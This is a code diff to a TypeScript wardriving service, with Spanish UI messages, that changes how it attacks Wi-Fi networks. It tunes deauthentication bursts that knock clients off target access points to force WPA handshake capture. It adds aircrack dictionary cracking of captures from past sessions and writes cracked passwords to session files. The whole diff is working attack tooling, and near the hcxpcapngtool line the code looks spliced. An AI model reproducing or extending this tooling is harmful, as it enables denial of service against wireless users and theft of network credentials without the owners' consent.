@@ -31,7 +31,10 @@ const PMKID_TIMEOUT_MS = 45_000;
 const PMKID_POLL_MS = 3_000;
 const DEAUTH_SETTLE_MS = 12_000; // client reassociation window after the burst
 const DEAUTH_BURST = 64; // directed, strong burst — aireplay sends this many per client
-const DEAUTH_MAX_ATTEMPTS = 5;
+// v3 policy: one deauth round is usually enough to force a 4-way handshake.
+// The attack ends after the FIRST deauth attempt's settle window; if no
+// handshake materialized, exactly ONE more attempt runs before giving up.
+const DEAUTH_MAX_ATTEMPTS = 2;
 const PMKID_PASSIVE_MS = 20_000; // extra passive window after deauth fails
 const BETWEEN_TARGETS_MS = 1_500;
 
@@ -108,20 +111,30 @@ export class WardriveService extends EventEmitter {
   }
 
   // Start a dictionary crack against a captured target. One at a time;
-  // progress is polled by the UI via dictStatus().
-  async startDictCrack(bssidRaw: string): Promise<{ ok: boolean; error?: string }> {
+  // progress is polled by the UI via dictStatus(). `capPathOverride`
+  // targets a PAST session's capture (the sessions browser's dict button);
+  // the path must resolve inside the sessions root (traversal-safe).
+  async startDictCrack(bssidRaw: string, capPathOverride?: string): Promise<{ ok: boolean; error?: string }> {
     const bssid = WardriveService.clean(bssidRaw);
     if (!bssid) return { ok: false, error: "BSSID inválido" };
     if (this.dictCrack?.getState().running) {
       return { ok: false, error: `Ya hay un crack en curso (${this.dictCrackBssid}) — cancelalo primero` };
     }
-    const target = this.targetMeta.get(bssid);
-    if (!target || target.status !== "captured") {
-      return { ok: false, error: "No hay captura para ese objetivo — audítalo primero" };
+    let capPath: string | null = null;
+    if (capPathOverride) {
+      capPath = this.resolveSessionPath(capPathOverride);
+      if (!capPath || !/\.(cap|pcapng)$/i.test(capPath) || !fs.existsSync(capPath)) {
+        return { ok: false, error: "Archivo .cap inválido o fuera de las sesiones" };
+      }
+    } else {
+      const target = this.targetMeta.get(bssid);
+      if (!target || target.status !== "captured") {
+        return { ok: false, error: "No hay captura para ese objetivo — audítalo primero" };
+      }
+      if (!this.session) return { ok: false, error: "Sin sesión de wardrive activa" };
+      capPath = resolveCapPath(this.session.dir, this.targetFiles(bssid));
+      if (!capPath) return { ok: false, error: "El objetivo no tiene archivo .cap" };
     }
-    if (!this.session) return { ok: false, error: "Sin sesión de wardrive activa" };
-    const capPath = resolveCapPath(this.session.dir, this.targetFiles(bssid));
-    if (!capPath) return { ok: false, error: "El objetivo no tiene archivo .cap" };
     const wordlist = this.dictWordlist();
     if (!fs.existsSync(wordlist)) {
       return { ok: false, error: `Diccionario no encontrado: ${wordlist}` };
@@ -134,7 +147,18 @@ export class WardriveService extends EventEmitter {
         this.verified.set(bssid, st.result);
         // The winning password is in aircrack's "KEY FOUND! [ ... ]" output.
         const m = /KEY FOUND!\s*\[\s*(.*?)\s*\]/.exec(st.result.output || "");
-        if (m) this.foundPasswords.set(bssid, { password: m[1], ssid: this.targetMeta.get(bssid)?.ssid || "" });
+        if (m) {
+          const password = m[1];
+          this.foundPasswords.set(bssid, { password, ssid: this.targetMeta.get(bssid)?.ssid || "" });
+          // Persist so the past-sessions browser can show it (eye toggle).
+          // With a capPathOverride the active session is not the capture's
+          // owner — write into the session folder the .cap belongs to.
+          if (capPathOverride) {
+            this.persistPastSessionPassword(path.dirname(capPath), bssid, password);
+          } else {
+            this.session?.setFoundPassword(bssid, password);
+          }
+        }
         this.appendLog(bssid, "[dict] KEY FOUND — handshake validado con diccionario");
       } else {
         this.appendLog(bssid, `[dict] terminado: ${st?.result?.verdict} (${st?.progress.tried || 0} contraseñas)`);
@@ -144,6 +168,32 @@ export class WardriveService extends EventEmitter {
     this.dictCrack.start();
     this.appendLog(bssid, `[dict] aircrack started with ${wordlist}`);
     return { ok: true };
+  }
+
+  // A dictionary crack that ran against a PAST session's .cap writes the
+  // recovered password into that session folder: session.json (targets[]
+  // password field, via a surgical read-modify-write) + the target's
+  // info.txt. Never fatal.
+  private persistPastSessionPassword(sessionDir: string, bssid: string, password: string): void {
+    try {
+      const metaFile = path.join(sessionDir, "session.json");
+      const meta = JSON.parse(fs.readFileSync(metaFile, "utf8"));
+      for (const t of meta.targets || []) {
+        if (String(t.bssid).toUpperCase() === bssid) t.password = password;
+      }
+      fs.writeFileSync(metaFile, JSON.stringify(meta, null, 2));
+      const infoFile = path.join(sessionDir, `${bssid.replace(/:/g, "").toLowerCase()}-info.txt`);
+      if (fs.existsSync(infoFile)) {
+        const text = fs.readFileSync(infoFile, "utf8");
+        const patched = text.replace(
+          /(CONTRASEÑA ENCONTRADA\n\s+).+/,
+          `$1${password}`,
+        );
+        fs.writeFileSync(infoFile, patched);
+      }
+    } catch (err: any) {
+      console.warn("[wardrive] past-session password persist failed:", err?.message || err);
+    }
   }
 
   stopDictCrack(): { ok: boolean } {
@@ -757,10 +807,12 @@ export class WardriveService extends EventEmitter {
     this.progress(bssid, "capture", "Captura activa, esperando clientes...");
 
     let captured = false;
-    let consecutiveZeroClients = 0;
     try {
       // Let airodump create its files and enumerate associated clients.
       await sleep(4_000);
+      // Policy: end the process on the first deauth round's settle window.
+      // If it produced no handshake, one more attempt runs — after that the
+      // capture is over (PMKID passive fallback below still applies).
       for (let attempt = 1; attempt <= DEAUTH_MAX_ATTEMPTS && !captured; attempt++) {
         if (this.attackAbort) break;
         this.updateMeta(bssid, { attempts: attempt });
@@ -769,13 +821,10 @@ export class WardriveService extends EventEmitter {
         // to a broadcast burst.
         let clients = [...new Set([...capturer.associatedClients(), ...seedClients])];
         if (clients.length === 0) {
-          consecutiveZeroClients++;
           const c = this.pickClientFor(bssid);
           if (c) clients = [c];
-        } else {
-          consecutiveZeroClients = 0;
         }
-        // If we've had 3 attempts with no clients detected, extend the wait.
+        // No clients anywhere: give the settle window double time.
         const settleMs = clients.length === 0 ? DEAUTH_SETTLE_MS * 2 : DEAUTH_SETTLE_MS;
         this.progress(bssid, "deauth", `Intento ${attempt}/${DEAUTH_MAX_ATTEMPTS}: deauth a ${clients.length} cliente(s)...`,
           clients.length > 0
@@ -793,12 +842,13 @@ export class WardriveService extends EventEmitter {
       `hcxpcapngtool -o <prefix>.hc22000 <prefix>-01.cap`);
     captured = await this.waitForCapture(bssid, capFile, settleMs);
         if (captured) {
-          this.progress(bssid, "validate", "¡Handshake capturado!");
+          // One deauth (or its reconnect frames) was enough — end the
+          // attack here, no extra attempts.
+          this.progress(bssid, "validate", "¡Handshake capturado! Deauth suficiente — cerrando captura");
           break;
         }
-        // Brief pause between attempts.
-        if (attempt < DEAUTH_MAX_ATTEMPTS && !captured) {
-          await sleep(2000);
+        if (attempt < DEAUTH_MAX_ATTEMPTS) {
+          this.progress(bssid, "deauth", "Sin handshake todavía — un intento más de deauth...");
         }
       }
     } finally {
@@ -895,7 +945,11 @@ export class WardriveService extends EventEmitter {
     this.activeValidation.delete(bssid);
     this.verified.set(bssid, result);
     this.lastValidatedPassword.set(bssid, result.matched ? password : `${password} (no matchea)`);
-    if (result.matched) this.foundPasswords.set(bssid, { password, ssid: this.targetMeta.get(bssid)?.ssid || "" });
+    if (result.matched) {
+      this.foundPasswords.set(bssid, { password, ssid: this.targetMeta.get(bssid)?.ssid || "" });
+      // Persist so the past-sessions browser can show it (eye toggle).
+      this.session.setFoundPassword(bssid, password);
+    }
     this.appendLog(bssid, `[validate] aircrack verdict=${result.verdict}${result.cancelled ? " (cancelado)" : ""}`);
     if (result.cancelled) {
       this.progress(bssid, "done", "Validación cancelada por el usuario");
@@ -984,7 +1038,11 @@ export class WardriveService extends EventEmitter {
     this.activeValidation.delete(bssid);
     this.verified.set(bssid, result);
     this.lastValidatedPassword.set(bssid, result.matched ? password : `${password} (no matchea)`);
-    if (result.matched) this.foundPasswords.set(bssid, { password, ssid: target.ssid });
+    if (result.matched) {
+      this.foundPasswords.set(bssid, { password, ssid: target.ssid });
+      // Persist so the past-sessions browser can show it (eye toggle).
+      this.session.setFoundPassword(bssid, password);
+    }
     this.appendLog(bssid, `[validate] verdict=${result.verdict}${result.cancelled ? " (cancelado)" : ""}`);
     this.session.writeTargetInfo(bssid, this.lastValidatedPassword.get(bssid));
     this.broadcastStatus();
